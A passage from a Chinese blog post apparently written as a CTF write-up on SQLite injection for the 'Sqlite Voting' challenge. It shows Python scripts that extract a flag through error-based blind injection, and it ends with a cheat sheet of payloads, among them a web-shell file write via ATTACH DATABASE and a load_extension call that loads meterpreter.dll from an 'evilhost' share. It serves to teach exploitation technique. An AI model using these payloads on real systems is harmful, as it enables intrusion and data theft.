class="headerlink" title="可供制造错误的函数"></a>可供制造错误的函数</h4><p>通过参考 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.sqlite.org/lang_corefunc.html">SQLite 官方手册的内置函数</a></p><p>我们找到了以下几个函数故意制造错误：</p><blockquote><p><code>load_extension(x)</code>、<code>load_extension(x,y)</code></p><p><code>load_extension(x,y)</code> 函数使用入口点 y 从名为 x 的共享库文件中加载 SQLite 扩展。<code>load_extension ()</code> 的结果总是 NULL 。如果省略 y，则使用默认的入口点名称。如果扩展未能正确加载或初始化，则 <code>load _ extension()</code> 函数<strong>引发异常</strong>。</p><p>这个函数可以加载动态库，如 windows 的 dll ，linux 的 so ，换言之，我们可以利用其进行远程命令执行，这可以参考这篇 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/qq_34101364/article/details/109250435">利用这个函数反弹 shell</a> 的博客。</p><p><code>abs(x)</code></p><p>返回数值参数 x 的绝对值，如果 x 为 NULL，则 abs(x) 返回 NULL。如果 x 是不能转换为数值的字符串或 blob，则 Abs (x) 返回0.0 。如果 x 是整数 -922337203685475808，那么 abs (x) <strong>抛出一个整数溢出错误</strong>。</p><p><img src="https://i.loli.net/2020/11/11/JGAwOYUvPhoHbfd.png" style="zoom:80%"></p><p>0x8000000000000000 为 -922337203685475808 的十六进制。</p><p><code>sum(x)</code></p><p>返回一组中所有非空值的数值总和。如果所有输入都是整数或者 NULL，在结果溢出时，<code>sum(x)</code> 将抛出一个<strong>“整数溢出”异常</strong> 。</p><p><code>ntile(n)</code></p><p>参数 n 被作为整数处理。这个函数将分区尽可能平均地划分为 n 组，并按 ORDER BY 子句定义的顺序或其他任意顺序将1到 n 之间的整数分配给每个组。如果有必要，会首先出现更大的组。此函数返回分配给当前行所属组的整数值。同上也是整数溢出。</p></blockquote><p>这里明显只能用整数溢出。</p><p>最朴素的盲注，是用 substr 和 ord 配合使用进行判断，但这里明显对其进行了限制，而且最重要的是，我们既不能用字符（引号被过滤），也不能用 ascii 码判断（ char 被过滤），那么我们到底要怎么才能判断每一位是否正确呢？</p><h4 id="利用长度变化的盲注"><a href="#利用长度变化的盲注" class="headerlink" title="利用长度变化的盲注"></a>利用长度变化的盲注</h4><blockquote><p>出题人 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-350-sqlite-voting">st98 师傅</a> 是利用 <code>replace</code> 来判断是否正确：</p><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.sqlite.org/lang_corefunc.html#replace">replace(x,y,z)</a></p><p>replace (x，y，z) 函数返回一个字符串，这个字符串是用字符串 z 替换字符串 x 中每个字符串 y 而形成的。BINARY 排序序列用于比较。如果 y 是一个空字符串，那么返回 x 不变。如果 z 最初不是字符串，则在处理之前将其强制转换为 UTF-8字符串。</p><p>简而言之，设 flag 为 <code>flag&#123;landv01&#125;</code> ，长度为 13 。</p><p><img src="https://i.loli.net/2020/11/11/QXFKjdHMwuDEmsC.png" style="zoom:80%"></p><p>长度变为了 9 ，是因 flag 中的 <code>flag</code> 四位被替换为空。</p><p>所以我们可以利用长度的变化来判断是否正确。</p><hr><p>下面是我对利用长度变化进行盲注的一些扩展：</p><p>实际上，我还找到了 <code>trim(x,y)</code> 企图达到与 <code>replace</code> 一样的效果：</p><p><img src="https://i.loli.net/2020/11/12/NgcCQxJ6EpmnePT.png" style="zoom:80%"></p><p>但当测试包含 <code>&#123;</code> 时，<code>trim(x,y)</code> 的回显为什么却是 6 ？</p><p><img src="https://i.loli.net/2020/11/12/xlyhmtvaBHYVsr6.png" style="zoom:80%"></p><p>结合<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.sqlite.org/lang_corefunc.html#trim">官方文档</a>的解释，<code>trim(x,y)</code> 函数返回一个字符串，该字符串由删除 X <strong>两端</strong>出现在 Y 中的<strong>任何和所有字符组成</strong>。</p><p>如果省略了 Y 参数，<code>trim(x)</code> 将删除 X 两端的空格（这是最常用的用法）</p><p>也就是说，如果 y 是 <code>flag&#123;</code> ，那么 <code>fla</code> 、<code>la</code> 这样的组合都会被删掉，所以并不能用于判断是否正确，虽说你可以一直寻找直至长度变化（ <code>ltrim()</code> 这里是删除 x 左端）：</p><p><img src="https://i.loli.net/2020/11/12/uh4NmtZgJCbjxPd.png" style="zoom:80%"></p><p>虽说在 SQLite <code>trim()</code> 不能很有效地判断，但在 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://docs.oracle.com/en/database/oracle/oracle-database/20/sqlrf/TRIM.html#GUID-00D5C77C-19B1-4894-828F-066746235B03">Oracle</a> 中是可行的：</p><p>“如果您指定了 LEADING，那么 Oracle 数据库将删除所有等于 trim _ character 的前导字符。”</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(trim(leading &#x27;f&#x27; from flag))</span><br></pre></td></tr></table></figure><p>上述语句可在 Oracle 中用于判断。</p></blockquote><p>现在我们报错和判断正确的手段都有了，就要考虑特殊字符的绕过。</p><p>一堆限制，就用 hex 编码来进行绕过，因为一些比较的运算符都被 ban 了，我们利用位运算符代替：</p><p>以下脚本来自出题人师傅博客。</p><p>首先考虑 flag 长度的判断。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abs(case(length(hex((select(flag)from(flag))))&amp;&#123;1&lt;&lt;n&#125;)when(0)then(0)else(0x8000000000000000)end)</span><br></pre></td></tr></table></figure><p>最外围我们用 <code>abs()</code> 抛出整数溢出的错误。</p><p>其中用 case 计算表达式，flag 长度与 <code>&#123;1&lt;&lt;n&#125;</code> 按位相与：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(hex((select(flag)from(flag))))  &amp;  &#123;1&lt;&lt;n&#125;</span><br></pre></td></tr></table></figure><p><code>&#123;1&lt;&lt;n&#125;</code> 也就是 2 的 n 次方，相与的作用只是为了把和 flag 长度（二进制）为 1 的部分记录下来，可想而知，一直从 1 循环到 n 为 16 ，我们把所有 1 都记录下来后，flag 的长度也就自然得出了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># フラグの長さを特定</span></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  r = requests.post(URL, data=&#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">f&#x27;abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span>&lt;&lt;j&#125;</span>)when(0)then(0)else(0x8000000000000000)end)&#x27;</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">    l |= <span class="number">1</span> &lt;&lt; j</span><br><span class="line">print(<span class="string">&#x27;[+] length:&#x27;</span>, l)</span><br></pre></td></tr></table></figure><p>然后就是比对 hex 编码，0123456789 都能正常运用，但像 abcdef 就又要用到引号。</p><h3 id="解法一-利用-trim-hex-删除构造字符"><a href="#解法一-利用-trim-hex-删除构造字符" class="headerlink" title="解法一 利用 trim + hex 删除构造字符"></a>解法一 利用 trim + hex 删除构造字符</h3><p>而上面我们不是提到 <code>trim()</code> 这个无差别，所有组合都会删除的函数吗，只要我们能构造出只有一个字母例如 A 的 hex 值，把全部数字删除，那不就得到 A 了吗？</p><p>如下，我们利用表中的数据和特殊函数的返回值来构造相应字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">&#x27;A&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)&#x27;</span> </span><br><span class="line"><span class="comment"># &#x27;zebra&#x27; → &#x27;7A65627261&#x27;</span></span><br><span class="line"><span class="comment"># trim 删除 1,2,5,6,7 后只剩下了 A ，以下同理</span></span><br><span class="line">table[<span class="string">&#x27;C&#x27;</span>] = <span class="string">&#x27;trim(hex(typeof(.1)),12567)&#x27;</span> </span><br><span class="line"><span class="comment"># &#x27;real&#x27; → &#x27;7265616C&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;D&#x27;</span>] = <span class="string">&#x27;trim(hex(0xffffffffffffffff),123)&#x27;</span> </span><br><span class="line"><span class="comment"># 0xffffffffffffffff = -1 → &#x27;2D31&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;E&#x27;</span>] = <span class="string">&#x27;trim(hex(0.1),1230)&#x27;</span> </span><br><span class="line"><span class="comment"># 0.1 → 302E31</span></span><br><span class="line">table[<span class="string">&#x27;F&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)&#x27;</span> </span><br><span class="line"><span class="comment"># &#x27;dog&#x27; → &#x27;646F67&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;B&#x27;</span>] = <span class="string">f&#x27;trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">&quot;C&quot;</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">&quot;F&quot;</span>]&#125;</span>)&#x27;</span> </span><br><span class="line"><span class="comment"># &#x27;koala&#x27; → &#x27;6B6F616C61&#x27;</span></span><br><span class="line"><span class="comment"># || 是连接符，第二项的意思是 16||C||F ，也就是利用 trim 删除 1,6,C,F </span></span><br></pre></td></tr></table></figure><p>接下来就是判断每一位字符了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># フラグをゲット!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里是已知 flag 格式为 HarekazeCTF&#123; ，我们对其 hex 编码，接下来只需要盲注后面的字符</span></span><br><span class="line">res = binascii.hexlify(<span class="string">b&#x27;HarekazeCTF&#123;&#x27;</span>).decode().upper()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res), l):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;0123456789ABCDEF&#x27;</span>:</span><br><span class="line">    t = <span class="string">&#x27;||&#x27;</span>.join(c <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">&#x27;0123456789&#x27;</span> <span class="keyword">else</span> table[c] <span class="keyword">for</span> c <span class="keyword">in</span> res + x)</span><br><span class="line">    r = requests.post(URL, data=&#123;</span><br><span class="line">      <span class="string">&#x27;id&#x27;</span>: <span class="string">f&#x27;abs(case(replace(length(replace(hex((select(flag)from(flag))),<span class="subst">&#123;t&#125;</span>,trim(0,0))),<span class="subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">      res += x</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  print(<span class="string">f&#x27;[+] flag (<span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;l&#125;</span>): <span class="subst">&#123;res&#125;</span>&#x27;</span>)</span><br><span class="line">  i += <span class="number">1</span></span><br><span class="line">print(<span class="string">&#x27;[+] flag:&#x27;</span>, binascii.unhexlify(res).decode())</span><br></pre></td></tr></table></figure><p><code>trim(0,0)</code> 实际上就是空，<code>l</code> 是 flag 的长度，<code>t</code> 是我们每次进行测试的字符串（如果有字符被确定了，就会被连接 <code>||</code> 进 <code>t</code> ）。</p><p>实际上，发送的请求是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abs(case(</span><br><span class="line">replace(</span><br><span class="line">length(replace(hex((select(flag)from(flag))),test_data,&#39;&#39;))    # 这里进行替换和获取长度</span><br><span class="line">,flag_length,&#39;&#39;)                                               # 第二个 replace 判断长度是否变化</span><br><span class="line">)when(&#39;&#39;)then(0)else(0x8000000000000000)end)</span><br></pre></td></tr></table></figure><p>如果长度变化了就会报错，那么就是测试的字符是有的，被添加进 <code>res</code> ，再十六进制转字符就 getflag 了。</p><h3 id="解法二-双重-hex-编码删除字母"><a href="#解法二-双重-hex-编码删除字母" class="headerlink" title="解法二 双重 hex 编码删除字母"></a>解法二 双重 hex 编码删除字母</h3><p>解法一是费了很大劲去构造出 abcdef 的，但我们可以直接双重编码，仅用数字来进行判断。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abs(ifnull(nullif(length((SELECT(flag)from(flag))),$LENGTH$),0x8000000000000000))</span><br></pre></td></tr></table></figure><p><code>ifnull</code> 返回两个参数中不为 0 的数，<code>nullif</code> 两个参数相同返回 NULL ，不同返回第一个参数。</p><p>换言之，以上 payload 在做的就是遍历 $LENGTH$ 找到与 flag 长度相等的数。</p><p>得到了长度，我们同样面临构造特数字符的问题，这里用了双重 hex 编码，编码后 flag 的长度即上面的 4 倍。</p><p>4 倍长度的 hex 纯数字编码会被用科学计数法表示，但我们可以用上面用到的 <code>||</code> 来进行连接，由这我们可以得到 payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abs(ifnull(nullif(max(hex(hex((SELECT(flag)from(flag)))),$NUMBER$),$NUMBER$),0x8000000000000000))</span><br></pre></td></tr></table></figure><p>所以便可遍历 4 倍长度的 $NUMBER$ ，利用 <code>max</code> 得到双重编码后的 flag ，双重解码后即可。</p><h1 id="Cheat-Sheet"><a href="#Cheat-Sheet" class="headerlink" title="Cheat Sheet"></a>Cheat Sheet</h1><p>下面结合题解直接来总结一套 Cheat Sheet，其中整合了一些外网搜集过来的 payload ，还有自己弄出来的一些：</p><div class="table-container"><table><thead><tr><th>name</th><th>syntax</th><th>description</th></tr></thead><tbody><tr><td>注释 1</td><td>—</td><td></td></tr><tr><td>注释 2</td><td>/**/</td><td></td></tr><tr><td>注释 3</td><td>[]</td><td></td></tr><tr><td>IF 语句</td><td>CASE WHEN</td><td></td></tr><tr><td>连接符</td><td>`</td><td></td><td>`</td><td></td></tr><tr><td>截取子串</td><td>substr(x,y,z)</td><td></td></tr><tr><td>获取长度</td><td>length(stuff)</td><td></td></tr><tr><td>获取版本信息</td><td>select sqlite_version();</td><td></td></tr><tr><td>获取表名</td><td>SELECT tbl_name FROM sqlite_master;</td><td></td></tr><tr><td>获取列名</td><td>SELECT sql FROM sqlite_master;</td><td></td></tr><tr><td>基于错误的盲注 1</td><td>abs(case(xxx)when(xxx)then(0)else(0x8000000000000000)end)</td><td>判断字符，abs 可由 sum 、ntile 等函数替换，case 计算的表达式可用如 replace(length(replace(x,y,z)),y,z) 这样利用长度变化判断</td></tr><tr><td>基于错误的盲注 2</td><td>abs(case(length(xxx)&amp;{1&lt;&lt;n})when(0)then(0)else(0x8000000000000000)end)</td><td>获取长度，需要脚本配合，n：1~16</td></tr><tr><td>基于错误的盲注 3</td><td>abs(ifnull(nullif(length((SELECT(flag)from(flag))),$LENGTH$),0x8000000000000000))</td><td>获取长度，通过遍历</td></tr><tr><td>生成单引号 1</td><td>select cast(X’27’ as text);</td><td></td></tr><tr><td>生成单引号 2</td><td>select substr(quote(hex(0)),1,1);</td><td>quote：返回SQL文字的文本，该文本是其参数的值，适合包含在SQL语句中。字符串由<strong>单引号</strong>包围。</td></tr><tr><td>生成双引号</td><td>select cast(X’22’ as text);</td><td></td></tr><tr><td>基于时间的盲注</td><td>1’ AND [RANDNUM]=LIKE(‘ABCDEFG’, UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))</td><td>供判断注入，RANDOMBLOB()函数生成指定长度的随机字符串。当这个长度足够大的时候就会让服务器产生明显的延迟。这样就可以判断语句的执行成功与否，这同时也是通用的注入 payload 。实际上，AND 后面的表达式计算出来是 0 。</td></tr><tr><td>布尔盲注 1</td><td>and (SELECT count(tbl_name) FROM sqlite_master WHERE type=’table’ and tbl_name NOT like ‘sqlite_%’ ) &lt; number_of_table</td><td>获得表的个数</td></tr><tr><td>布尔盲注 2</td><td>and (SELECT length(tbl_name) FROM sqlite_master WHERE type=’table’ and tbl_name not like ‘sqlite_%’ limit 1 offset 0)=table_name_length_number</td><td>列举表名</td></tr><tr><td>布尔盲注 3</td><td>and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type=’table’ and tbl_name NOT like ‘sqlite_%’ limit 1 offset 0) &gt; hex(‘some_char’)</td><td>获得数据</td></tr><tr><td>文件写入</td><td>1’;ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (‘’;—</td><td>需要堆叠查询对应配置开启</td></tr><tr><td>代码执行</td><td>UNION SELECT 1,load_extension(‘\\evilhost\evilshare\meterpreter.dll’,’DllMain’);—</td><td>具体使用可以看上面介绍给出的链接，默认情况下这个函数是禁用的。</td></tr></tbody></table></div><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet">https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet</a></p><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf">https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf</a></p></div><div class="popular-posts-header">推荐文章</div><ul class="popular-posts"><li class="popular-posts-item"><div class="popular-posts-title"><a href="\archives\61d01802.html" rel="bookmark">每周审计之74CMS 各版本复现</a></div></li><li class="popular-posts-item"><div class="popular-posts-title"><a href="\archives\c46ecd7.html" rel="bookmark">每周审计之ZZCMS v8.2 复现</a></div></li></ul><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>landvsec</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="https://landvsec.top/archives/d8b7f817.html" title="CTF中的SQLite合集">https://landvsec.top/archives/d8b7f817.html</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><footer class="post-footer"><div class="post-tags"><a href="/tags/SQLite%E6%B3%A8%E5%85%A5/" rel="tag"># SQLite注入</a></div><div class="post-nav"><div class="post-nav-item"><a href="/archives/15015253.html" rel="prev" title="MongoDB 注入初识"><i class="fa fa-chevron-left"></i> MongoDB 注入初识</a></div><div class="post-nav-item"><a href="/archives/5856e475.html" rel="next" title="2020 SquareCTF Web 复现记录">2020 SquareCTF Web 复现记录 <i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div><div class="comments" id="valine-comments"></div><script>window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9D%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">初识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">2.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A4%E5%88%AB"><span class="nav-number">2.2.</span> <span class="nav-text">数据库判别</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">3.</span> <span class="nav-text">题解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#phpNantokaAdmin"><span class="nav-number">3.1.</span> <span class="nav-text">phpNantokaAdmin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Sqlite-Voting"><span class="nav-number">3.2.</span> <span class="nav-text">Sqlite Voting</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84-SQLite-%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.2.1.</span> <span class="nav-text">基于错误的 SQLite 盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%AF%E4%BE%9B%E5%88%B6%E9%80%A0%E9%94%99%E8%AF%AF%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">3.2.1.1.</span> <span class="nav-text">可供制造错误的函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%95%BF%E5%BA%A6%E5%8F%98%E5%8C%96%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.2.1.2.</span> <span class="nav-text">利用长度变化的盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-%E5%88%A9%E7%94%A8-trim-hex-%E5%88%A0%E9%99%A4%E6%9E%84%E9%80%A0%E5%AD%97%E7%AC%A6"><span class="nav-number">3.2.2.</span> <span class="nav-text">解法一 利用 trim + hex 删除构造字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-%E5%8F%8C%E9%87%8D-hex-%E7%BC%96%E7%A0%81%E5%88%A0%E9%99%A4%E5%AD%97%E6%AF%8D"><span class="nav-number">3.2.3.</span> <span class="nav-text">解法二 双重 hex 编码删除字母</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Cheat-Sheet"><span class="nav-number">4.</span> <span class="nav-text">Cheat Sheet</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="landvsec" src="/images/landv.jpg"><p class="site-author-name" itemprop="name">landvsec</p><div class="site-description" itemprop="description">困于山中，被鬼追逐。</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">11</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">4</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">10</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/landvsec" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;landvsec" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-github"></i></a> </span><span class="links-of-author-item"><a href="mailto:landv.sec@outlook.com" title="E-Mail → mailto:landv.sec@outlook.com" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-envelope"></i></a> </span><span class="links-of-author-item"><a href="https://twitter.com/landvsec" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;landvsec" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-twitter"></i></a></span></div></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2020</span> <span class="with-love"><i class="fa fa-user"></i> </span><span class="author" itemprop="copyrightHolder">landvsec</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-area-chart"></i> </span><span title="站点总字数">86k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span title="站点阅读时长">1:19</span></div><div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">NexT.Gemini</a> v7.7.2</div></div></footer></div><script src="/lib/anime.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script src="/js/local-search.js"></script><script>NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : '0yViUOGA7HtJMAXySVB4izzL-gzGzoHsz',
      appKey     : 'j8ykiSEAw39cFwbk9Hrh2hQP',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});</script></body></html>